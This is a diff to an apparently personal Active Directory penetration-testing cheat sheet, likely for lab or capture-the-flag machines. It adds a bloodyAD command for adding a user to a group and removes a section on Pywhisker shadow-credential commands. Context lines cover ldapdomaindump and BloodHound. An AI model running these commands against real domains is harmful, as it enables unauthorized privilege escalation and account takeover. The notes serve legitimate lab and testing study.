@@ -12,6 +12,13 @@ Another good option is to dump the entire domain
 `ldapdomaindump ldap://$target_ip -u "$domain\\$user" -p $pass`
 
 
+
+# AD object modification
+## Modifying group membership
+Add user $target_user to group $target_group using bloodyAD:
+`bloodyAD --host $target_ip -d $domain -u $user -p $pass  add groupMember $target_group $target_user$` 
+
+
 # Bloodhound
 So good. So, so good.
 
@@ -39,11 +46,3 @@ nameserver 10.10.11.69
 - Upload the data to bloodhound from the GUI by going to Administration > File Ingest > Upload File(s). 
 - Once uploaded go to the Explore tab > Search Nodes > Type in the name of a user or group
 - Also try out pathfinding from your current position to the target node. Select the arrows between nodes to see if an escalation path is possible
-
-
-# Creating Shadow Credentials with Pywhisker
-This tool allows users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object.
-
-Install into a virtual environment using pip: `pip install pywhisker`
-- `pywhisker -d $domain -u "$user" -p "$pass" --target "$target_account" --action "list"`: List current KeyCredential IDs for the target account
-- `pywhisker -d $domain -u "$user" -p "$pass" --target "$target_account" --action "add" --filename output.pfx`
